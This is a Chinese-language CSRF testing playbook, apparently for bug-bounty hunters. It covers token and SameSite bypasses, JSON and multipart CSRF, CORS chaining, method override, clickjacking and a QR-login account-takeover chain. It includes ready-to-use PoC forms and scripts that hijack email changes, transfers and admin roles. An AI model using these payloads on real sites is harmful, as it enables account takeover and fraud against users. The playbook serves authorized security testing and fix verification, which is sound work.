---
phase: webapp
vuln_class: [csrf]
title: CSRF 测试
summary: 四个必要条件缺一即不成立；绕过顺序是「先删 token → 换 token → 改 Content-Type → 打 SameSite」。
---

> **SRC 纪律：** 本文测 **CSRF 写成功** 等仍可作中高（有跨用户/敏感写才报）。
> 文中出现的 CORS 仅作链路基座理解；**禁止**把 CORS 单独写成主洞报告（`cors-vuln-report-priority`：不挖不写）。

# CSRF 测试

## 0. 判据速查

| 现象 | 判据 | 打法 |
|---|---|---|
| 状态变更接口无 token 参数 | 无防护 | 直接表单 POST |
| 有 token，但删掉仍成功 | **token 未校验**（最常见） | 删参即绕过，无需别的花招 |
| 删不掉，但改成随机值仍成功 | 只校验存在性 | 随便填 |
| 用 B 用户的 token 打 A 的会话能过 | token 绑会话但没绑用户 | 换 token |
| token 只在 Cookie 里回读 | 双提交模式 | 子域 cookie tossing 写死值 |
| token 全站相同 / = base64(user) / = 时间戳 | 可预测 | 直接构造 |
| Cookie 无 `SameSite` 或 `=None` | 经典 CSRF 成立 | 跨站表单直接打 |
| `SameSite=Lax` + 接口吃 GET | 顶栏 GET 带 Cookie | `<img>` / `location=` / 302 链 |
| `SameSite=Lax` + Cookie 刚下发 2 分钟内 | Chrome Lax+POST 例外 | 先 `window.open` 刷新会话再 POST |
| 接口只收 `application/json` | 表单发不出该类型 | 降级 `text/plain` 或找 CORS |
| 改 `multipart/form-data` 仍处理 | Content-Type 未校验 | 表单直发 |
| `X-Frame-Options` / CSP `frame-ancestors` 都缺 | 可被框 | 点击劫持代替 CSRF |
| 扫码登录回包含 token，登录页吃 `?token=` | 确认扫码这一步可被 CSRF | 见 §18 |

---

## 1. 四个必要条件

```text
1. 受害者处于已认证状态（有活跃会话 Cookie）
2. 服务端只靠 Cookie 识别身份（无二次校验）
3. 攻击者能预测/构造出这条合法请求
4. Cookie 会跨站发送（SameSite=None 或旧浏览器行为）
```

**缺一条就不成立**。判断顺序：先看 4（SameSite），再看 2（有没有 token/Origin 校验），最后看 3（参数能不能猜）。

---

## 2. 高价值目标

```text
改密码            → 账号接管
改邮箱            → 账号接管
加管理员 / 改角色  → 提权
转账 / 支付        → 资金
OAuth 应用授权     → 劫持授权流
删除账号
关闭二次验证       → 后续接管
添加 SSH key / API key
配置 Webhook      → 把数据外送
改个人/联系人信息
```

判据：**只要这一下能改掉"谁能登录"或"钱去哪"，就值得打**。改昵称、改头像这类不报。

---

## 3. Token 绕过

### 3.1 无 token

表单里压根没有 CSRF 字段。最简形态，直接构造 POST。

### 3.2 Token 未校验（最常见）

token 在请求里，但服务端根本不验：

```text
把 _csrf_token 参数整个删掉 → 请求还成功吗？
→ 成功 = 平凡绕过，不需要任何花招
```

### 3.3 Token 绑会话但不绑用户

```text
1. 用 A 登录 → 拿到 A 的 token
2. 用 B 登录 → 拿到 B 的 token
3. 把 B 的 token 塞进 A 的会话提交
→ 服务端只校验「token 存在」，不校验「属于这个会话」→ 绕过
```

### 3.4 Token 只在 Cookie 里

```text
Set-Cookie: csrf=ATTACKER_CONTROLLED
→ 若子域能写 .target.com 的 cookie（cookie tossing），就能把值定死
→ header 与 cookie 都填同一个已知值 → 双提交模式失守
```

### 3.5 静态 / 可预测 token

```text
全站所有用户同一个 token
token = base64(username) 或 md5(session_id) → 可逆
token = 时间戳 → 可猜
```

### 3.6 双提交 Cookie 的破法

```text
攻击者能从子域 XSS 或 cookie tossing 写 .target.com 的 cookie：
→ 设 csrf_cookie=CONTROLLED
→ 请求里带 X-CSRF-Token: CONTROLLED
→ 服务端比对 header == cookie → 相等 → 绕过
```

---

## 4. SameSite 三态

| 值 | 跨站 POST | 顶栏 GET | 判据 |
|---|---|---|---|
| `None` | 带 | 带 | 经典 CSRF 直接成立（需 `Secure`） |
| `Lax`（现代默认） | **不带** | 带 | 只能走 GET 或 2 分钟例外 |
| `Strict` | 不带 | 不带 | 只能靠同站 XSS 或子域 |
| 未设置 | 看浏览器 | 看浏览器 | 老浏览器等同 None |

### 4.1 Lax 走 GET

```html
<img src="https://target.com/account/delete?confirm=yes">
<script>document.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>
```

前提：**服务端接受 GET 做状态变更**。

### 4.2 Lax/Strict 靠子域 XSS

```javascript
// sub.target.com 上的 XSS → 同站源 → SameSite Cookie 照发
window.location = 'https://target.com/account/modify?evil=true';
```

判据：`SameSite` 只管**跨站**，不管**同站**。同站子域失守等于 SameSite 全废。

### 4.3 2 分钟例外（Chrome Lax+POST）

Cookie 下发后 2 分钟内，`SameSite=Lax` 的 Cookie **会**随跨站 POST 发送（为 OAuth 流程留的口子）。

```javascript
window.open('https://target.com/login');       // 刷新会话 Cookie
setTimeout(() => {                             // 2 分钟内打
  const f = document.createElement('form');
  f.method = 'POST';
  f.action = 'https://target.com/account/change-email';
  f.innerHTML = '<input name="email" value="attacker@evil.com">';
  document.body.appendChild(f);
  f.submit();
}, 5000);
```

---

## 5. PoC 模板

```html
<!-- 基础表单 -->
<form id="csrf" action="https://target.com/account/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
```

```html
<!-- onload 自动提交 -->
<body onload="document.forms[0].submit()">
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
</body>
```

```html
<!-- GET 型 -->
<img src="https://target.com/api/v1/admin/delete-user?id=12345" style="display:none">
```

---

## 6. JSON CSRF

### 6.1 表单发不出 `application/json`

HTML 表单只支持三种 `enctype`：`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`。**这是 JSON CSRF 的第一道墙**。

### 6.2 Content-Type 降级（最实用）

服务端若不严格校验 Content-Type，把 JSON 塞进 `text/plain`：

```html
<form enctype="text/plain" method="POST" action="https://target.com/api">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```

实际发出：

```text
{"email":"attacker@evil.com","ignore":"="}
```

多出的 `="` 用 `ignore` 字段吃掉，JSON 仍合法。

```html
<!-- 改角色版 -->
<form action="https://target.com/api/role" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
</form>
```

### 6.3 form-urlencoded 也能过

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

后端若把 `role=admin&user_id=123` 与 `{"role":"admin","user_id":123}` 当同一回事 → 纯 HTML 表单即可，无需 CORS。

### 6.4 fetch / XHR（需 CORS 配合）

```javascript
fetch('https://target.com/api/role', {
  method: 'POST', credentials: 'include', mode: 'no-cors',
  headers: {'Content-Type': 'text/plain'},
  body: '{"role":"admin"}'
});
```

```javascript
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/role", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"role":"admin"}');
```

**判据**：`fetch(..., mode:'no-cors')` **不能**设 `application/json`（会触发预检），也读不到响应。所以这条路只在两种情况下成立：
1. 服务端接受 `text/plain` 并当 JSON 解析；
2. CORS 配错（`ACAO` 回显 + `ACAC: true`），此时可用正常 fetch 并读回响应。

---

## 7. multipart CSRF

`Content-Type` 从 `application/json` 改成 `multipart/form-data` 仍能处理：

```html
<form method="POST" action="https://target.com/api/update" enctype="multipart/form-data">
  <input name="email" value="attacker@evil.com">
</form>
```

判据：服务端按"字段名取值"而不是"按 JSON 解析"，多部分表单天然满足。

文件上传型：

```javascript
var fd = new FormData();
fd.append("file", new Blob(["..."], {type: "text/plain"}), "shell.php");
fd.append("action", "upload");
fetch("https://target.com/upload", {method:"POST", credentials:"include", body: fd});
```

---

## 8. CSRF + XSS

CSRF 防护做得很严时，XSS 直接把 token 读出来再提交——**同源，一切防护失效**。

```javascript
var token = document.querySelector('input[name="csrf_token"]').value;
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/delete', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes&csrf_token=' + token);
```

判据：有存储型 XSS 就别再纠结 CSRF token 了，直接写"XSS 导致 CSRF 防护失效"。

---

## 9. OAuth CSRF（缺 state）

```text
1. 攻击者发起 OAuth，拿到 authorization code
2. 换 token 之前停手（截下带 code 的回调 URL）
3. 把 https://target.com/oauth/callback?code=ATTACKER_CODE 发给受害者
4. 受害者浏览器完成换取 → 他的账号绑到攻击者的 OAuth 身份
→ 攻击者可用自己的身份登入受害者账号
```

细节见 `web/漏洞分类/JWT/OAuth-JWT-SAML 安全.md` §3.2。

---

## 10. 检查清单

```text
□ 删掉 CSRF token → 还成功吗
□ token 换成随机值 → 还成功吗
□ 用另一个用户的 token → 还成功吗
□ POST 接口有没有 GET 版本
□ 会话 Cookie 的 SameSite 是什么
□ Content-Type 换 json → form → text/plain → multipart 还处理吗
□ 不发 Referer 还成功吗（Referer 校验是否真的生效）
□ Referer 里伪造子域能过吗（弱 Referer 校验）
□ OAuth 流程缺 state 吗
□ 扫码登录：token 能进 URL 吗、已登录点开是否等于确认（§18）
```

> JSON CSRF 只以「**写操作是否跨站成功**」为证；**勿单独交 CORS 报告**（SRC 不挖不写 CORS）。

---

## 11. CSPT2CSRF（客户端路径穿越转 CSRF）

```text
正常: 前端 fetch /api/user/PROFILE_ID/settings
攻击: PROFILE_ID = ../../admin/dangerous-action

结果: 前端 fetch() 带着受害者的 Cookie 打到 /api/admin/dangerous-action
→ 不碰 CSRF token，也不用跨站，纯同源
```

| 维度 | 传统 CSRF | CSPT2CSRF |
|---|---|---|
| 来源 | 攻击者站点 | 同源 JS |
| token 绕过 | 需伪造/窃取 | 完全不需要（同源） |
| SameSite | `Strict` 能挡 | **挡不住**（同站） |
| 检测点 | 标准 CSRF 检查 | 检查路径片段是否被拼进 URL |

**判据**：前端把用户可控值直接拼进 `fetch` 路径，且后端按前缀路由 → 可穿越。

---

## 12. SameSite=Lax 进阶绕过

### 12.1 302 链把 GET 变成动作

```text
1. 攻击者页 → 302 到 https://target.com/transfer?to=attacker&amount=1000
2. 浏览器按顶栏导航跟随 → Lax Cookie 照发
3. 目标若接受 GET 做状态变更 → 成功
```

### 12.2 Method Override：POST 伪装成 GET

很多框架支持方法覆盖：

```text
GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1
GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1
```

触发覆盖的头/参数：

```text
X-HTTP-Method-Override: POST
X-Method-Override: DELETE
_method=PUT          # Rails / Laravel / Symfony
```

**这是 Lax 下最容易被忽略的一枪**：Lax 允许顶栏 GET，框架再把 GET 当 POST/DELETE 处理 → 所谓"只收 POST"的接口照样被打。

---

## 13. CSRF + CORS 链

> **SRC：** 本节只帮理解「读 token → 再 CSRF 写」。主洞写 **CSRF / 越权写**；**不要**另交 CORS 报告。

### 13.1 回显 Origin + 带凭据

```text
1. API 把 Origin 回显进 Access-Control-Allow-Origin
2. Access-Control-Allow-Credentials: true
3. 攻击者页发带凭据的 fetch
4. 响应可读 → 从响应里取出 CSRF token
5. 第二个请求带上真 token → 所有 CSRF 防护失效
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://target.com/api/change-email', {
      method: 'POST', credentials: 'include',
      headers: {'Content-Type': 'application/json', 'X-CSRF-Token': d.csrf_token},
      body: JSON.stringify({email: 'attacker@evil.com'})
  }));
```

### 13.2 子域 XSS → CORS → CSRF

`*.target.com` 在 CORS 白名单里，且任一子域有 XSS：从 XSS 上下文 fetch `api.target.com` → 读出 token → 提交。

---

## 14. CSRF Token 固定

token 在**认证之前**下发，登录后不变：

```text
1. 攻击者访问 target.com → 拿到 token T1
2. 让受害者的浏览器也用上 T1：
   a. 子域 cookie tossing
   b. CRLF 注入写 csrf_cookie
3. 受害者登录 —— token 没变
4. 攻击者用已知的 T1 提交 → 成功
```

测试：

```text
□ 未登录时拿一个 token
□ 登录后 token 变了吗
□ 没变 = 可固定，用登录前的 token 打认证后接口
```

---

## 15. 点击劫持作为 CSRF 绕过

CSRF 防护很严但页面可被框住时，用点击劫持代替。

```html
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;"></iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">Click to claim prize!</button>
</div>
```

判据：

```text
□ X-Frame-Options: DENY / SAMEORIGIN 有吗
□ CSP frame-ancestors 'self' / 'none' 有吗
□ 两个都没有 → 可框 → 点击发生在 iframe 内，同源，token 照发
```

---

## 16. 怎么判"已修好"

| 防护 | 有效判据 | 无效表现 |
|---|---|---|
| CSRF token | 删、改、换别人的 token 全部失败 | 只校验存在性 |
| SameSite=Strict | 跨站一律不带 | 只在部分浏览器生效 |
| 双提交 Cookie | 子域无法写 cookie | 子域可 tossing |
| Origin / Referer 校验 | 缺 Referer 也拒绝、子域伪造也拒绝 | 只判 `contains("target.com")` |
| 自定义头要求 | 强制预检、CORS 不放行 | 同时开了宽 CORS |
| 二次确认（密码/验证码） | 无法绕过 | 确认参数可省略 |

---

## 18. 扫码登录 CSRF → 用户接管（短表有指针）

> 本质：已登录用户被骗打开一条 URL，Cookie 自己带过去，等于帮攻击者点了「确认扫码」。
> 和改密/转账 CSRF 同类，打在「确认扫码」这一下。短表一行指向本节。
> 进库的是手法，不是某个站的 token 实值。

### 18.1 认什么（开场就能认）

同时出现就当开场几枪：

- 登录页有二维码 / 「用 App 扫码」
- 不登录调生成接口，回包里有 `token`（或 ticket / scene / sid），常带过期时间
- 同一站还有登录 URL 吃 query：`/login?token=`、`?ticket=`、`agentType=` 之类

### 18.2 链怎么穿（两边浏览器）

```text
攻击者（无痕、未登录）
  → 打开扫码登录
  → 抓住生成 token 的请求/响应（常见 path 含 qrcode / qr / gen_login_token / is_token_login）
  → 把 token 塞进登录页 URL

受害者（已登录同一站点）
  → 打开这条 URL（顶栏跳转即可，和 SameSite=Lax 顶栏 GET 对得上）
  → 服务端把该 token 绑到他的号上（等于扫码确认）

攻击者无痕
  → 轮询/刷新后变成受害者的号
```

构造形态（字段名按现场改，不要死抄）：

```text
https://目标登录页?token=刚才拿到的token
https://目标登录页?agentType=数字&token=...&lang=...
```

### 18.3 出什么算成

攻击者**未登录**的那一端出现对方头像/账号，能当对方用。
只证明「已登录的人打开了链接」不算；必须无痕那边登录态过来。

### 18.4 假点（形态不是洞，不是「这站没打穿」）

- token 过期后再点，两边都没登录
- 点开只重新出一张码，不把 token 绑到当前已登录号
- 必须手机 App 真扫，URL 打开不算确认

这站 401 / token 换了一串没中 → 只说明这站不行，**下一站同类照样打**，不删短表这行。

### 18.5 和邻近手法别混

| 本条 | 别当成 |
|------|--------|
| 确认扫码这一下的 CSRF | 不登录直接读业务接口 |
| 受害者要已登录（要会话） | 无密码登录绕过、空密进后台 |
| GET 登录 URL 就能确认 | 必须 POST + 自定义头才改状态的 CSRF（那种还要另测） |

OAuth 缺 `state` 把 code 丢给受害者（§9）是近亲：都是「已登录的人打开攻击者准备好的回调」。扫码这条认的是 **QR token**，不是 authorization code。

### 18.6 开场探针（有入口就打，半分钟级）

1. 不登录打开扫码登录，抓生成 token 的接口
2. 看响应有没有 token / 过期字段；看前端会不会拼 `/login?token=`
3. 自己已登录的另一个配置打开拼好的 URL
4. 回未登录端看是否变成自己的号

第 4 步成立 → 按 `src-value` 写接管报告。密钥/token 实值只写报告，不写进短表。

### 18.7 社交 App 内置浏览器（见了再打）

页是在社交 App WebView 里打开、且会按域自动带 `pskey` / 静默 OAuth 时：同域 XSS 可以顺手把凭证带出去，或替已登录用户点确认扫码。**不是每站必打**；没有这层壳，仍只打上面的扫码 CSRF。不进短表。

---

## 纪律

1. **先删 token，再想花招**。绝大多数 CSRF 报告死在"token 没校验"这一步，不需要 JSON 降级、不需要 CORS。
2. **四个必要条件逐条过**，缺一条就不成立，别硬写。
3. **SameSite=Lax 不等于修好**。查 GET 版本、查 `_method` 覆盖、查 2 分钟例外。
4. **`SameSite` 只管跨站不管同站**。同站子域 XSS 是 SameSite 的完全绕过。
5. **JSON CSRF 的第一道墙是表单 enctype**，先试 `text/plain` 降级，再谈 CORS。
6. **CORS 只作链路，不作主洞**。SRC 不挖不写 CORS。
7. **改昵称/改头像不报**。必须有跨用户或敏感写。
8. 报告只认 `rules/vuln-report-format.md`。
